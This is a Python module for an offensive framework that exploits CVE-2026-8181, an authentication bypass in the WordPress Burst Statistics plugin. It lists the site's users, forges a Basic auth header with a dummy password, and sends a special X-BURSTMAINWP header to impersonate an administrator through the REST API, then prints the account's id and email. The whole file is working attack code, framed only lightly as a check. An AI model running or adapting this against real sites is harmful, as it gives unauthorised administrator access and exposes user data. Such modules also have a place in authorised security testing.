#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-8181 — verify Burst Statistics MainWP REST impersonation."""

from __future__ import annotations

import base64
import json
import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Burst Statistics CVE-2026-8181 MainWP auth bypass check",
        "description": "Reads /wp-json/wp/v2/users/me as administrator via X-BURSTMAINWP.",
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-8181",
        "tags": ["wordpress", "burst-statistics", "auth-bypass", "cve-2026-8181"],
    }

    admin_user = OptString("admin", "Administrator slug to impersonate", required=False)

    def run(self):
        user = str(self.admin_user or "admin").strip()
        users = self.http_request(method="GET", path="/wp-json/wp/v2/users", allow_redirects=True)
        if users and int(users.status_code) == 200:
            slug_m = re.search(r'"slug"\s*:\s*"([^"]+)"', users.text or "")
            if slug_m:
                user = slug_m.group(1)
        token = base64.b64encode(f"{user}:x".encode()).decode()
        resp = self.http_request(
            method="GET",
            path="/wp-json/wp/v2/users/me?context=edit",
            headers={
                "X-BURSTMAINWP": "1",
                "Authorization": f"Basic {token}",
            },
            allow_redirects=True,
        )
        if not resp or int(resp.status_code) != 200:
            print_error("MainWP bypass probe failed")
            return False
        try:
            data = json.loads(resp.text or "")
        except json.JSONDecodeError:
            print_error("Non-JSON response")
            return False
        roles = data.get("roles") or []
        if "administrator" not in roles:
            print_error("Administrator role not returned")
            return False
        print_success(f"Impersonated user id={data.get('id')} email={data.get('email')}")
        return True
